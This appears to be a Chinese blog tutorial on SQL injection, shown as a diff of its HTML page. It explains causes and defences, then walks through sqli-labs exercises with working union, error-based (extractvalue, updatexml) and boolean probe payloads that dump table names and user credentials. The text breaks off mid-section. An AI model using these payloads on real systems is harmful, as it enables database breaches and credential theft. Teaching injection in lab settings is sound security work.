@@ -1,0 +1,1327 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="sql注入, 鹤归">
+    <meta name="description" content="
+·前言结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。SQL注入（SQL Injection）是一种常见的Web安全漏洞，主要形成的原因是在数据交互">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>sql注入 | 鹤归</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">鹤归</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-book" style="zoom: 0.6;"></i>
+      
+      <span>文章</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>标签</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>分类</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>时轴</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>清单</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/musics">
+          
+          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>音乐</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/movies">
+          
+          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>电影</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/galleries">
+          
+          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>相册</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">鹤归</div>
+        <div class="logo-desc">
+            
+            手书无愧，无惧人间是非
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-book"></i>
+			
+			文章
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>标签</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>分类</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>时轴</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			清单
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/musics " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
+			      
+		          <span>音乐</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/movies " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-film" style="position: absolute;left:50px" ></i>
+			      
+		          <span>电影</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/galleries " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
+			      
+		          <span>相册</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/103.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">sql注入</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E5%AE%89/">
+                                <span class="chip bg-color">网安</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">漏洞</span>
+                            </a>
+                        
+                            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">sql注入</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/sql%E6%B3%A8%E5%85%A5/" class="post-category">
+                                sql注入
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-23
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    12.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    49 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p><a name="Lha6Q"></a></p>
+<h1 id="·前言"><a href="#·前言" class="headerlink" title="·前言"></a>·前言</h1><p>结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。<br /><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>（SQL Injection）是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限陷）<strong>。</strong><br /><strong>即：注入产生的原因是后台服务器接收相关参数未经过滤直接带入数据库查询</strong><br />在学习sql注入前，我们需要了解sql语句的基本语法 ——&gt; <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114327303?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163875545216780269895046%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163875545216780269895046&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-114327303.pc_v2_rank_blog_default&utm_term=mysql&spm=1018.2226.3001.4450">mysql基础学习</a><br><a name="I05lS"></a></p>
+<h2 id="一、漏洞原因分析"><a href="#一、漏洞原因分析" class="headerlink" title="一、漏洞原因分析"></a>一、漏洞原因分析</h2><p>我们都知道web分为前端和后端，前端负责进行展示，后端负责处理来自前端的请求并提供前端展示的资源，即然有资源，那么就需要有存储资源的地方——如mysql数据库。那服务器如何对数据获取了？就需要使用SQL语句这一语法结构进行查询获取。SQL语句通过特有的语法对数据进行查询<br />我们可以举一个例子，以<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>第一关为例，按要求在url后面加上?id&#x3D;1，显示如下<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211046260.png" alt="image-20230724211046260"><br />当我们改变id的值为2是，页面发生了改变。说明它将我们输入的数据代入到了数据中进行查询，页面根据输入数据的不同展示的内容也不同。<br />ps：url中?代表传值的意思，id代表变量，后面的”&#x3D;”代表变量的值<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211059152.png" alt="image-20230724211059152"><br />为了更清楚的看清sql语句的执行与变化过程，我们先修改源代码，打开Less-1&#x2F;index.php，在源码中添加如下语句将执行的sql语句打印出来，方便我们查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;执行的sql语句为：&#x27;.$sql;</span><br><span class="line"></span><br><span class="line">echo &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">echo &#x27;&lt;br/&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211116282.png" alt="image-20230724211116282"><br />访问页面如下，打印出了执行的sql语句<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211127500.png" alt="image-20230724211127500"><br />在1后面加上单引号, ?id&#x3D;1’，页面显示有语法错误，说靠近 ‘1’’ limit 0,1有语法错误，我们输入的数据 1’ 被完整的带入到了SQL语句中，即直接与原有的sql语句进行了拼接。然后执行的sql语句变成了<br />$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’  1 ‘ ‘ LIMIT 0,1”;<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211151225.png" alt="image-20230724211151225"><br />我们输入的那个单引号和前面的单引号产生了闭合，导致原有后面的那个单引号变成了多余，而sql语法中引号是必须成对出现的否则就会报错。<br />既然输入的单引号成了多余也就证明程序没有对我们的输入进行过滤，那我们就构造语句将单引号进行闭合就好了。我们在1后面加上单引号，与前面的引号构成闭合，再接着在后面插入我们自己想要查询的语句就可以查询我们想要查询的数据，就这样被脱库的风险就悄悄的发生。<br><a name="R90vq"></a></p>
+<h2 id="二、漏洞危害"><a href="#二、漏洞危害" class="headerlink" title="二、漏洞危害"></a><strong>二、漏洞危害</strong></h2><p>SQL注入漏洞对于数据安全的影响：</p>
+<ul>
+<li><strong>数据库信息泄漏：</strong>数据库中存放的用户的隐私信息的泄露。</li>
+<li><strong>网页篡改：</strong>通过操作数据库对特定网页进行篡改。</li>
+<li><strong>网站被挂马，传播恶意软件：</strong>修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li>
+<li><strong>数据库被恶意操作：</strong>数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li>
+<li><strong>服务器被远程控制，被安装后门：</strong>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li>
+<li><strong>破坏硬盘数据，瘫痪全系统。</strong><br><a name="fRPZt"></a></li>
+</ul>
+<h2 id="三、sql注入防范"><a href="#三、sql注入防范" class="headerlink" title="三、sql注入防范"></a><strong>三、sql注入防范</strong></h2><p>解决SQL注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。通常修复使用的方案有：<br />代码层面：</p>
+<ol>
+<li>对输入进行严格的转义和过滤</li>
+<li>使用参数化（Parameterized）：目前有很多ORM框架会自动使用参数化解决注入问题，但其也提供了”拼接”的方式,所以使用时需要慎重!</li>
+<li>PDO预处理 (Java、PHP防范推荐方法：)</li>
+</ol>
+<p>⛔没有进行PDO预处理的SQL，在输入SQL语句进行执行的时候，web服务器自己拼凑SQL的时候有可能会把危险的SQL语句拼凑进去。但如果进行了PDO预处理的SQL，会让MYSQL自己进行拼凑，就算夹带了危险的SQL语句，也不会进行处理只会当成参数传进去，而不是以拼接进SQL语句传进去，从而防止了SQL注入<br />网络层面：</p>
+<ol>
+<li>通过WAF设备启用防SQL Inject注入策略（或类似防护系统）</li>
+<li>云端防护（如阿里云盾）<br><a name="zet9G"></a></li>
+</ol>
+<h2 id="四、如何挖掘sql注入漏洞"><a href="#四、如何挖掘sql注入漏洞" class="headerlink" title="四、如何挖掘sql注入漏洞"></a>四、如何挖掘sql注入漏洞</h2><p><em><strong>1. 注入可能存在的地方</strong></em><br />竟然是sql注入，那么这个地方肯定是与数据库有数据交互的，所以我们可以优先观察那种页面存在传值或者查询的地方。比如url中的GET型传参，如?id&#x3D;1<br />如我们看见这种就可以考虑<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724211151225.png"><br />或者是搜索框，前端将用户输入的数据代入到数据库中进行查询，这种以POST方法进行发送数据。如下这种地方<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232630117.png" alt="image-20230724232630117"><br />或者是HTTP请求头部字段如Cookie值，下面会讲到。<br /><em><strong>2. 漏洞探测</strong></em><br />此时需要我们用burp截取查询的数据包，找到传参的变量然后在其后面加上单引号、双引号等如下payload进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#判断如下闭合方式是否会报错，会报错则肯定存在注入</span><br><span class="line"></span><br><span class="line">=test&#x27;                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=test&quot;                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#若不报错则判断是否存在布尔盲注，如果页面会有不同的显示在可能存在漏洞</span><br><span class="line"></span><br><span class="line">=test&#x27; and -1=-1 or &#x27;</span><br><span class="line"></span><br><span class="line">=test&#x27; and -1=-2 or &#x27;  </span><br><span class="line"></span><br><span class="line">=test&quot; and -1=-1 or &quot;</span><br><span class="line"></span><br><span class="line">=test&quot; and -1=-2 or &quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232719155.png" alt="image-20230724232719155"><br />ps：目前网站的sql注入基本都能通过漏洞扫描器xray检测出来 ——&gt; <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114954341?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163876029516780261918664%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163876029516780261918664&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-2-114954341.pc_v2_rank_blog_default&utm_term=xray&spm=1018.2226.3001.4450">xray与burp联动</a>，但是这样动静太大（公网上），如果在内网中可以直接挂上xray进行检测。所以在公网时可以手动检测是否存在漏洞，然后在存在漏洞的地方打上*，接着复制整个请求包在txt文档中用sqlmap -r进行注入 ——&gt; <a target="_blank" rel="noopener" href="https://chenchena.blog.csdn.net/article/details/118566645">sqlmap -r</a><br />补充：<br /><em>get型</em><br />1. 进行url编码<br />在url中进行测试payload需要先进行url编码<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232730792.png" alt="image-20230724232730792"><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232742620.png" alt="image-20230724232742620"><br />不进行编码的话，也可以用+代替空格，#代替–+ 。 %23代表#，也是注释符<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232754505.png" alt="image-20230724232754505"><br /><em>post型</em><br />如果是post型的话，我们可以用上面的方法进行编码，或者使用+代替空格，也可以不使用，直接像在浏览器中探测一样<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232808867.png" alt="image-20230724232808867"><br><a name="jEqBO"></a></p>
+<h2 id="五、常见的注入手法"><a href="#五、常见的注入手法" class="headerlink" title="五、常见的注入手法"></a>五、常见的注入手法</h2><p>SQL 注入漏洞根据不同的标准，有不同的分类。如按照参数类型可分为两种：数字型和字符型。<br /><em><strong>参数类型分类</strong></em><br />1. 数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。<br />如 <a target="_blank" rel="noopener" href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> 对应的sql语句为 select * from table where id&#x3D;3<br />2. 字符型：字符型注入正好相反<br />当输入的参数被当做字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过引号来闭合的。即看参数是否被引号包裹<br />例如数字型语句：select * from table where id &#x3D;3<br />则字符型如下：select * from table where name&#x3D;’admin’<br /><strong><em>注入手法分类</em></strong><br />@   UNION query SQL injection（联合查询注入）<br />@   Error-based SQL injection（错型注入）<br />@   Boolean-based blind SQL injection（基于布尔的盲注）<br />@   Time-based blind SQL injection（基于时间的盲注）<br />@   Stacked queries SQL injection（可多语句查询注入）<br />为了练习sql注入，我们使用sqli-labs靶场进行sql注入学习，网上有很多安装教程这里就不演示了。建议学这个之前先学习mysql语法，不然理解不了sql语句<br><a name="CMMWJ"></a></p>
+<h3 id="联合查询-union注入"><a href="#联合查询-union注入" class="headerlink" title="联合查询(union注入)"></a>联合查询(union注入)</h3><p>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化 ，<br />漏洞靶场实战，传送门 -》<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/115969983">webug 4.0 第一关 显错注入</a><br />我们以sqli-labs第一关为例来学习联合查询。如下，要求我们传入一个id值过去<br />传参?id&#x3D;1<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232920974.png" alt="image-20230724232920974"><br /><em>1. 页面观察</em><br />当我们输入id&#x3D;1和id&#x3D;2时，页面中name值和password的值是不一样的，说明此时我们输入的数据和数据库有交互并且将数据显示在屏幕上了<br /><em>2. 注入点判断</em><br />开始判断是否存在注入，输入?id&#x3D;1’，页面发生报错，说明后端对我前端的数据输入没有很好的过滤，产生了sql注入漏洞<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232932165.png" alt="image-20230724232932165"><br />继续判断 <br />?id&#x3D;1’ and 1&#x3D;1 –+   页面正常显示   传送门 -》<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114808681">关于sql注入中的 –+</a><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232941792.png" alt="image-20230724232941792"><br />?id&#x3D;1’ and 1&#x3D;2 –+  页面不正常显示，说明程序对我们的输入做出了正确的判断，所以注入点就是单引号<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724232959963.png" alt="image-20230724232959963"><br /><em>3. 判断当前表的字段个数</em><br />?id&#x3D;1 order by 3 –+   <br />传送门 -》<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114809458">关于order by</a><br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233013392.png" alt="image-20230724233013392"><br />?id&#x3D;1 order by 4 –+ ,此时显示未知的列，说明此时当前表中只有3列<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233024386.png" alt="image-20230724233024386"><br /><em>4. 判断显示位</em><br />上面我们判断出来了表中有3列，接下来判断我们的输入会在屏幕哪个地方进行回显<br />?id&#x3D;-1’ union select 1,2,3 –+ <br />让union select前面的参数查不出来，所以id&#x3D;-1’<br />如下，在name和password中回显了我们的输入，这时我们就随便选一个地方来放置接下来的测试语句。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233037959.png" alt="image-20230724233037959"><br /><em>5. 爆数据库名字</em><br />?id&#x3D;-1’ union select 1,database(),3 –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233053335.png" alt="image-20230724233053335"><br /><em>6. 爆数据库中的表</em><br />?id&#x3D;-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() –+<br />其中爆出来数据库中存在三个表<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233109355.png" alt="image-20230724233109355"><br /><em>7. 爆表中的字段</em><br />我们这里选择一个表，users进行进一步的获取表中的字段值<br />?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ –+<br />获取到三个字段，分别为id,username,password<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233122020.png" alt="image-20230724233122020"><br /><em>8. 爆相应字段的所有数据</em><br />?id&#x3D;-1’ union select 1,group_concat(id,’–’,username,’–’,password),3 from users –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233133822.png" alt="image-20230724233133822"><br />至此，一次完整的脱库过程结束了，联合查询也就结束了。<br><a name="jS4kM"></a></p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。<br />报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。<br />推荐三种报错注入的方法，直接套用就行。以less-1为例子<br /><strong>1. group by 重复键冲</strong><br />and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()<em>2))x from information_schema.tables group by x)a) –+<br />提交如下，获取数据库名字<br />?id&#x3D;1’ and (select 1 from (select count(</em>),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233144750.png" alt="image-20230724233144750"><br /><strong>2. extractvalue() 函数</strong><br />?id&#x3D;1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+<br />提交 ?id&#x3D;1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+  获取数据库名字<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233155563.png" alt="image-20230724233155563"><br /><strong>3. updatexml() 函数</strong><br />and updatexml(1,concat(‘^’,(需要查询的内容),’^’),1)<br />1. 提交如下，获取数据库名字<br />?id&#x3D;1’ and updatexml(1,concat(‘^’,(database()),’^’),1) –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233213195.png" alt="image-20230724233213195"><br />2. 获取当前数据库中表的名字<br />?id&#x3D;1’ and updatexml(1,concat(‘^’,(select table_name from information_schema.tables where table_schema&#x3D;’security’ ),’^’),1) –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233234039.png" alt="image-20230724233234039"><br />这里是说要显示的内容超过一行它不能显示那么多，所以在 table_schema&#x3D;’security’ 后加上 limit 0,1，显示第一行（显示第0行的往下一行，不包括第0行）<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233244602.png" alt="image-20230724233244602"><br />如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users<br />3. 爆表中的字段<br />?id&#x3D;1’ and updatexml(1,concat(‘^’,(select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’ limit 0,1 ),’^’),1) –+<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233256018.png" alt="image-20230724233256018"><br />总共爆出的字段为： id , username , password<br />4. 爆字段中的内容<br />?id&#x3D;1’ and updatexml(1,concat(‘^’,(select group_concat(username,”–”,password) from users limit 0,1 ),’^’),1) –+<br />三组用户名和密码。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233307728.png" alt="image-20230724233307728"><br><a name="Npwye"></a></p>
+<h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例<br />1. 我们输入正确的id，显示You are in …..<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233322820.png" alt="image-20230724233322820"><br />我们输入错误的语句如id&#x3D;1’ ，或者id&#x3D;-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724233334362.png" alt="image-20230724233334362"><br />源码如下</p>
